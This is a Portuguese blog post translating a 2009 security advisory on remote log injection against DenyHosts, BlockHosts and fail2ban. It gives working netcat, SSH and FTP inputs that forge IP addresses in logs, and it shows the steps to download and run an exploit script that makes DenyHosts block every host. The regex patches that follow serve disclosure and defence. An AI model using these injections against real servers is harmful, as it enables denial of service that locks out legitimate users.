---
title: 'Atacando ferramentas de análise de logs'
date: '2009-04-10T17:38:03-04:00'
tags:
    - segurança
---

O texto a seguir é uma tradução do texto de Daniel Cid que achei muito interessante. O material original pode ser acessado por [aqui](http://www.ossec.net/en/attacking-loganalysis.html).

**1 – Introdução**  
Análise de logs utilizando uma ferramenta LIDS (Log Based Intrusion Detection System), pode ser uma técnica muito poderosa para complementar as funções de NIDS/HIDS e melhorar a segurança de uma rede. Já citei alguns de seus benefícios nos artigos: [Log analysis for  
intrusion detection](http://www.ossec.net/en/loganalysis.html) e [Log analysis using OSSEC](http://www.ossec.net/ossec-docs/auscert-2007-dcid.pdf).

Entretanto, como qualquer outra tecnologia quando não é implementada corretamente, pode acabar adicionando novas vulnerabilidades e trazer mais problemas que benefícios.

A finalidade deste artigo é apontar algumas vulnerabilidades que encontrei em ferramentas de análise de logs opensource utilizadas para impedir ataques brute force contra o SSH e o FTP. Como essas ferramentas respondem automaticamente a algum evento (bloqueando automaticamente o IP do suposto atacante), elas seriam bons exemplos. Porém, qualquer ferramenta que analise logs pode estar tão vulnerável quanto as citadas neste documento.

Iremos mostrar 3 ataques 0-day de denial of service causadas por log injection nas ferramentas BlockHosts, DenyHosts e fail2ban.

\*Este paper discute o remote log injection, onde um atacante externo consegue modificar um log, baseado nas informações que ele fornece a alguma aplicação (no nosso caso OpenSSH e vsftpd). Modificando a maneira como a aplicação loga determinados eventos, somos capazes de atacar estas ferramentas de análise de logs. Não falaremos sobre modificações de logs localmente ou “syslog injection”.

\*\*Sou o autor do [OSSEC](http://www.ossec.net/), um HIDS (Host Based Intrusion Detection System), que, entre outras coisas, analisa logs e automatiza determinadas ações. Ele não é vulnerável a nenhuma das técnicas apresentadas neste texto, mas pode ser que você queira testá-lo.

**2 – Log injection remoto**  
Todos sabemos que nunca devemos confiar em informações fornecidas por usuários, especialmente quando falamos sobre desenvolvimento para web, mas parece que esquecemos disso quando lidamos com logs.

A regra é: nunca devemos confiar em informações fornecidas por usuários que serão gravadas em um log. Porquê eu digo isso? Para começar, vamos analisar alguns logs do SSH.

Quando você erra uma senha, o SSH loga o seguinte (a segunda e a terceira linhas são escritas quando você utiliza um nome de usuário inválido):  

```bash
Jun 2 14:49:00 crazymom sshd[5862]: Failed password for root from 192.168.50.65 port 34780 ssh2
Jun 2 14:49:42 crazymom sshd[5866]: Invalid user invuser from 192.168.50.65
Jun 2 14:49:46 crazymom sshd[5866]: Failed password for invalid user invuser from 192.168.50.65 port 34786 ssh2
```

Note que os logs gerados pelo SSH fornecem o nome de usuário e o endereço IP relacionados áquela conexão. Porém, o nome de usuário é informado pelo usuário!

E se nós informarmos o seguinte como sendo o nome de usuário:  
`<br></br>[dcid@enigma log]$ ssh “myfakeuser from 10.1.1.1 port 123 ssh2 “@192.168.5.1<br></br>`

Como ficariam os logs?  
`<br></br>Jun 2 14:54:00 crazymom sshd[5870]: Invalid user myfakeuser from 10.1.1.1 port 123 ssh2 from 192.168.50.65<br></br>Jun 2 14:54:03 crazymom sshd[5870]: Failed password for invalid user myfakeuser from 10.1.1.1 port 123 ssh2 from 192.168.50.65 port 34813 ssh2<br></br>`

E um log FTP? Aqui, eu utilizei o vsftpd como um exemplo, mas isto se aplica a todas as aplicações. Dê uma olhada nos logs quando nós tentamos modificar o nome de usuário:  
`<br></br>root@slacker:~# ftp 192.168.3.4<br></br>220 Welcome to labs ossec candy FTP service.<br></br>Name (192.168.2.3:root): myuser<br></br>..<br></br>`  
`<br></br>root@slacker:~# ftp 192.168.3.4<br></br>220 Welcome to labs ossec candy FTP service.<br></br>Name (192.168.2.3:root): lala] FAIL LOGIN: Client “2.3.4.54?<br></br>..<br></br>`

Dando uma olhada nos logs:  
`<br></br>Mon Jun 2 21:05:30 2007 [pid 1448] [myuser] FAIL LOGIN: Client “192.168.3.1?<br></br>Mon Jun 2 21:06:02 2007 [pid 1452] [lala] FAIL LOGIN: Client “2.3.4.54? ] FAIL LOGIN: Client “192.168.3.1?<br></br>`

Todos nós conhecemos SQL Injection, a idéia aqui não é tão diferente. Nós estamos apenas enviando o nome de usuário de uma forma que engane uma ferramenta de análise de logs, fazendo com que a ferramenta pense que o IP de origem é outro completamente diferente do endereço real.

Outra coisa muito interessante que nós vamos utilizar um pouco mais à frente, é o modo como o SSH loga eventos de protocolos inválidos:  
`<br></br>root@slacker:~# nc 192.168.3.4 22<br></br>SSH-1.99-OpenSSH_4.2<br></br>hi me<br></br>Protocol mismatch.<br></br>`

Dando uma olhada nos logs:  
`<br></br>Jun 2 21:27:37 slacker sshd[1457]: Bad protocol version identification ‘hi me’ from 192.168.3.1<br></br>`

Você consegue encontrar a string fornecida pelo usuário no log acima? A questão é: como a sua ferramenta de análise de logs lida com estas alterações nos logs?

**3 – DoS remoto no DenyHosts**  
O [DenyHosts](http://denyhosts.sourceforge.net/) é uma ferramenta muito popular para a monitoração dos logs do SSH, com mais de 6 mil usuários, de acordo com o site oficial. Ele monitora os seus logs do SSH e automaticamente bloqueia o endereço IP de origem de uma conexão que produza muitas falhas de autenticação.

O DenyHosts sofria com algumas vulnerabilidades no passado, quando ele era vulnerável a um log injection muito simples (como os exemplos mostrados acima).

Entretanto, a sua última versão (2.6) ainda é vulnerável a log injection, porém de uma forma diferente que pode causar um DoS sério no SSH. Vamos explorá-lo.

Se você utilizar o netcat (como mostrado no exemplo da seção anterior) assim:  
`<br></br>dcid@enigma:~/Desktop$ nc 10.1.1.18 22<br></br>SSH-1.99-OpenSSH_3.9p1<br></br>hi<br></br>Protocol mismatch.<br></br>`

Como será o log gerado pelo servidor?  
`<br></br>Apr 25 13:17:50 crazymom sshd[4150]: Bad protocol version identification ‘hi’ from 10.1.1.4<br></br>`

Sim, todas as vezes que você envia uma informação de protocolo inválido para o servidor, ele vai registrar o valor fornecido pelo usuário no log. Se tentarmos:  
`<br></br>dcid@enigma:~/Desktop$ nc 10.1.1.18 22<br></br>SSH-1.99-OpenSSH_3.9p1<br></br>User root from 10.2.3.5 not allowed because none of user’s groups are listed in AllowGroups<br></br>Protocol mismatch.<br></br>`

Como o server vai logar?  
`<br></br>Apr 25 13:19:32 crazymom sshd[4153]: Bad protocol version identification ‘User root from 10.2.3.5 not allowed because none of user’s groups are listed in AllowGroups’ from 10.1.1.4<br></br>`

Você consegue identificar a string que nós fornecemos ali na mensagem do log? E se nós utilizarmos o DenyHosts para analisar os nossos logs? O que você acha que ele vai fazer com isso (se eu repetir isso 5 vezes, na configuração padrão)?  
`<br></br>[root@crazymom DenyHosts]# tail -f /var/log/denyhosts<br></br>2007-04-25 13:20:59,068 - denyhosts : INFO new denied hosts: [’10.2.3.5?]<br></br>`

Sim, ele adicionou o IP falso enviado pelo usuário ao arquivo /etc/hosts.deny. Então, o problema é que o DenyHosts é vulnerável a log injection, permitindo aos usuários inserirem o que eles quiserem no arquivo hosts.deny.

Porque o DenyHosts (2.6) faz isso? Se analisarmos o código-fonte, veremos que a expressão regular utilizada por ele para uma mensagem de erro específica do SSH (dentro do arquivo DenyHosts/regex.py):  
`<br></br>FAILED_ENTRY_REGEX5 = re.compile(r”"”User (?P.*) .*from (?P.*) not allowed because none of user’s groups are listed in AllowGroups”"”)<br></br>`

Basicamente, ele procura por “User from …” em qualquer parte no log, nem mesmo checa se isto está no meio da mensagem “bad protocol version”. Como podemos consertar isso? Basta fazer uma expressão regular mais robusta (um “$” no final resolveria o problema)!

Você pode achar que isso não é um grande problema. Mas e se, ao invés de um endereço IP, eu passar a palavra “all”? — “all” no arquivo hosts.deny significa bloquear todo e qualquer endereço IP. Ele iria bloquear conexões de toda a Internet? Sim! Ele iria!  
`<br></br>dcid@enigma:~$ nc 192.168.5.1 22<br></br>SSH-1.99-OpenSSH_3.9p1<br></br>User root from all not allowed because none of user’s groups are listed in AllowGroups<br></br>Protocol mismatch.<br></br>`

Nos logs:  
`<br></br>Apr 25 13:19:32 crazymom sshd[4153]: Bad protocol version identification ‘ User root from all not allowed because none of user’s groups are listed in AllowGroups’ from 10.1.1.14<br></br>`  
`<br></br>root@crazymom DenyHosts]# tail -f /var/log/denyhosts<br></br>`  
`<br></br>2007-04-25 13:35:28,954 - denyhosts : INFO new denied hosts: [’all’]<br></br>`  
`<br></br>[root@crazymom DenyHosts]# cat /etc/hosts.deny<br></br>#<br></br># hosts.deny This file describes the names of the hosts which are<br></br># *not* allowed to use the local INET services, as decided<br></br># by the ‘/usr/sbin/tcpd’ server.<br></br>#<br></br>sshd: all<br></br>`

Você acabou de bloquear todo mundo nessa máquina. Eu desenvolvi um [“exploit”](http://www.ossec.net/denyhosts-exp.sh) simples para provar. Basta executá-lo e fornecer o endereço IP da máquina que será atacada:  
`<br></br>dcid@enigma:~$ wget <a href="http://www.ossec.net/denyhosts-exp.sh" rel="noopener" target="_blank" title="http://www.ossec.net/denyhosts-exp.sh">http://www.ossec.net/denyhosts-exp.sh</a><br></br>dcid@enigma:~$ chmod +x denyhosts-exp.sh<br></br>dcid@enigma:~$ ./denyhosts-exp.sh<br></br>./denyhosts-exp.sh:<br></br>dcid@enigma:~$ ./denyhosts-exp.sh 10.1.1.8<br></br>1<br></br>SSH-1.99-OpenSSH_3.9p1<br></br>Protocol mismatch.<br></br>..<br></br>SSH-1.99-OpenSSH_3.9p1<br></br>Protocol mismatch.<br></br>20<br></br>`  
`<br></br>dcid@enigma:~$ ssh 10.1.1.8<br></br>ssh_exchange_identification: Connection closed by remote host<br></br>`

Nos logs do servidor:  
`<br></br>[root@mb DenyHosts]# cat /etc/hosts.deny<br></br>#<br></br># hosts.deny This file describes the names of the hosts which are<br></br># *not* allowed to use the local INET services, as decided<br></br># by the ‘/usr/sbin/tcpd’ server.<br></br>sshd: all<br></br>`

**4 – Outros programas vulneráveis**  
Nós utilizamos o DenyHosts no nosso exemplo anterior por ser uma das ferramentas mais famosas, mas ela não é a única vulnerável.

A última versão do [BlockHosts](http://www.aczoom.com/cms/blockhosts) (2.0.3) também é vulnerável a log injection em logs do SSH e do vsftpd. O motivo é o mesmo do DenyHosts: uma expressão regular muito abrangente.  
`<br></br>root@slacker:~# ftp 192.168.3.4<br></br>220 Welcome to labs ossec candy FTP service.<br></br>Name (192.168.2.3:root): lala] FAIL LOGIN: Client “2.3.4.54?<br></br>..<br></br>`

Dando uma olhada nos logs:  
`<br></br>Mon Jun 2 21:06:02 2007 [pid 1452] [lala] FAIL LOGIN: Client “2.3.4.54? ] FAIL LOGIN: Client “192.168.3.1?<br></br>`

Se nós digitarmos um nome de usuário modificar para injetar um endereço IP, ele irá bloquear o endereço IP falso ao invés do IP verdadeiro.  
`<br></br>root@slacker:~# cat /etc/hosts.deny<br></br>#—- BlockHosts Additions<br></br>ALL: 2.3.4.54 : deny<br></br>..<br></br>#—- BlockHosts Additions<br></br>`

Em relação aos logs do SSH, o problema é o mesmo do DenyHosts. Se nós injetarmos qualquer dado no campo de identificação do protocolo, o BlockHosts irá trabalhar apenas com o IP falso, fornecido pelo usuário (o exploit desenvolvido para o DenyHosts vai funcionar também, apenas irá precisar de pequenas mudanças).  
`<br></br>dcid@enigma:~$ nc 192.168.5.1 22<br></br>SSH-1.99-OpenSSH_3.9p1<br></br>sshd[123]: User myself from 1.5.6.7 not allowed<br></br>Protocol mismatch.<br></br>`

Dando uma olhada nos logs:  
`<br></br>Jun 4 14:49:46 slacker sshd[4153]: Bad protocol version identification ’sshd[123]: User myself from 1.5.6.7 not allowed ‘ from 10.1.1.14<br></br>`  
`<br></br>root@slacker:~# cat /etc/hosts.deny<br></br>#—- BlockHosts Additions<br></br>ALL: 1.5.6.7 : deny<br></br>..<br></br>#—- BlockHosts Additions<br></br>`

\*O autor do BlockHosts, Avinash Chopde, já lançou um [patch](http://www.ossec.net/en/attacking-loganalysis.html#patches) para a ferramenta.

A última versão do [Fail2ban](http://www.fail2ban.org/), 0.8, é vulnerável às mesmas log injections no log do SSH do DenyHosts e BlockHosts. Ele procura pela mensagem “ROOT LOGIN REFUSED” em qualquer lugar nos logs e, como já foi exemplificado, podemos fazer uma injection facilmente a mensagem “bad protocol identification” do SSH.  
`<br></br>dcid@enigma:~$ nc 192.168.5.1 22<br></br>SSH-1.99-OpenSSH_3.9p1<br></br>ROOT LOGIN REFUSED hi FROM 1.5.6.7<br></br>Protocol mismatch.<br></br>`

O log fica:  
`<br></br>Jun 4 14:49:46 slacker sshd[4153]: Bad protocol version identification ‘ROOT LOGIN REFUSED hi FROM 1.5.6.7 ‘ from 10.1.1.14<br></br>`

\*O autor do Fail2ban, Cyril Jaquier, já disponibilizou um [patch](http://www.ossec.net/en/attacking-loganalysis.html#patches) para a ferramenta.

\*\*Esta falha é similar à [CVE-2006-6302](http://nvd.nist.gov/nvd.cfm?cvename=CVE-2006-6302), porém utilizar um vetor diferente. Obrigado a Cyril Jaquier por chamar minha atenção para isso.

**5 – Patches**  
O autor do Fail2ban, Cyril Jaquier, desenvolveu um patch que corrige o problema:  
`<br></br>— sshd.conf.orig 2007-06-05 22:00:24.000000000 +0200<br></br>+++ sshd.conf 2007-06-05 22:00:41.000000000 +0200<br></br>@@ -14,10 +14,10 @@<br></br># (?:::f{4,6}:)?(?PS+)<br></br># Values: TEXT<br></br>#<br></br>-failregex = Authentication failure for .* from<br></br>- Failed [-/w]+ for .* from<br></br>- ROOT LOGIN REFUSED .* FROM<br></br>- [iI](?:llegal|nvalid) user .* from<br></br>+failregex = Authentication failure for .* from $<br></br>+ Failed [-/w]+ for .* from $<br></br>+ ROOT LOGIN REFUSED .* FROM $<br></br>+ [iI](?:llegal|nvalid) user .* from $<br></br>`  
`<br></br># Option: ignoreregex<br></br># Notes.: regex to ignore. If this regex matches, the line is ignored.<br></br>`

O autor do BlockHosts, Avinash Chopde, informou que modificar as expressões regulares dos serviços SSH/VSFTPD para as seguintes, resolve o problema:  
`<br></br>“SSHD-NotAllowed”: r”"”^.*(?!sshd)sshd[(?Pd+)]: User .* from (::ffff:)?(?Pd{1,3}.d{1,3}.d{1,3}.d{1,3}) not allowed because none of user’s groups are listed in AllowGroups$”"”,<br></br>`  
`<br></br>“VSFTPD-Fail”: r”"”[pid d+] [.*?] FAIL LOGIN: Client “(?Pd{1,3}.d{1,3}.d{1,3}.d{1,3})”$”"”,<br></br>`

Nós conversamos com o autor do DenyHosts, Phil Schwartz, mas ainda não foi disponibilizado um patch oficial. Entretanto, modificando a regex FAILED\_ENTRY\_REGEX5 (no arquivo regex.py) para o seguinte, corrige o problema:  
`<br></br>FAILED_ENTRY_REGEX5 = re.compile(r”"”User (?P.*) .*from (?P.*) not allowed because none of user’s groups are listed in AllowGroups$”"”)<br></br>`

**6 – Conclusão**  
O objetivo deste documento é mostrar alguns dos problemas mais comuns com log injections, sobre os quais devemos saber quando desenvolvemos programas que analisem mensagens de logs.

Note também que existem outras ferramentas que “bloqueiam scans SSH”, mas algumas delas são tão vulneráveis que nem perdi meu tempo mencionando-as. Meu conselho é: não use ferramentas desenvolvidas em shell script ou que estejam há muito tempo sem ser atualizadas. Elas não só são vulneráveis a DoS remoto, mas também a execução de comandos via hosts.deny (sim, é possível configurá-lo para executar programas) e outros meios também.

Para concluir, se você alguma vez escrever um script para analisar os seus logs, tome muito cuidado com esses problemas.

\*\*Se você tiver qualquer pergunta ou comentários, por favor envie um e-mail para dcid ( at ) ossec.net.
